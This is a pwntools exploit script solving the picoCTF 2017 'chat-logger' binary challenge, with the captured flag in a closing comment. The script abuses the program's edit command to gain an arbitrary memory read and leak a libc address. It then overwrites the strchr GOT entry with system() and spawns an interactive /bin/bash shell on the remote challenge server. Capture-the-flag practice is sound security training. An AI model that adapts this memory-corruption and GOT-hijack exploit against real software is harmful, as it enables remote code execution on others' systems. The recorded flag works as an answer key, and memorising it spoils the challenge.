#! /usr/bin/env python2

from pwn import *
import sys

if args['REMOTE']:
    r = remote("shell2017.picoctf.com", 37454)
elif args['QIRA']:
    r = remote("192.168.0.7", 4000)
else:
    r = process("./chat-logger")

off_msg = 30
p_lsm = 0x601e78
p_strchr = 0x601e60
off_lsm = 0x21a50
off_system = 0x41490

def w(offset, val):
    global r
    padlen = len(val) + offset
    for ck in reversed(mkchunks(val)):
        r.recvuntil("> ")
        padlen -= len(ck) + 1
        # print ("X" * padlen + ck).encode("hex")
        r.sendline("edit " + "X" * padlen + ck)

def mkchunks(s):
    v = []
    i = 0
    while len(s) > 0:
        w = False
        if s[i] == "\x00":
            w = True
        elif s[i] == "\x0a":
            print "rip... got newline"
            sys.exit(0)
        if w or i == len(s) - 1:
            v.append(s[0:i])
            s = s[i + 1:]
            i = 0
        else:
            i += 1
    return v

def read(addr):
    global r
    global off_msg
    v = ""
    for i in xrange(8):
        w(off_msg, p64(400) + p64(0x10000) + p64(addr + i) + p64(0))
        r.recvuntil("> ")
        r.sendline("chat 1")
        l = r.recvline()[11:][:-1]
        if l == "":
            v += "\x00"
        else:
            v += l[0]
    return u64(v)

r.recvuntil("> ")
r.sendline("find 1 Sure")
for i in xrange(26):
    r.recvuntil("> ")
    r.sendline("add {} {}".format(i, chr(0x41 + i) * 5))
r.recvuntil("> ")
r.sendline("add 100 " + "x" * 200)
r.recvuntil("> ")
r.sendline("find 1 ZZZZZ")
r.recvuntil("> ")
r.sendline("add 101 " + "y" * 200)
r.recvuntil("> ")
r.sendline("find 1 ZZZZZ")

print "leaking libc..."
lsm = read(p_lsm)
libc_base = lsm - off_lsm
system = libc_base + off_system
print "libc_start_main = {}".format(hex(lsm))
print "system          = {}".format(hex(system))

# we pick offset - 8 so we can clobber yet another GOT entry to get around the
# +2 in update_message
w(off_msg, p64(500) + p64(0x10000) + p64(p_strchr - 8) + p64(0))
r.recvuntil("> ")
r.sendline("chat 1")
s_strchr = r.recvline()[11:][:-1]

print "overwriting strchr..."
r.recvuntil("> ")
r.sendline("find 1 " + s_strchr)
r.recvuntil("> ")
s_system = p64(system).replace("\x00", "")
print s_system.encode("hex")
r.sendline("edit AAAAAA" + s_system)

print "triggering exploit..."
r.recvuntil("> ")
r.sendline("/bin/bash")
r.interactive()

# flag: 131e9ca8da118859ebfb759c10d0e548
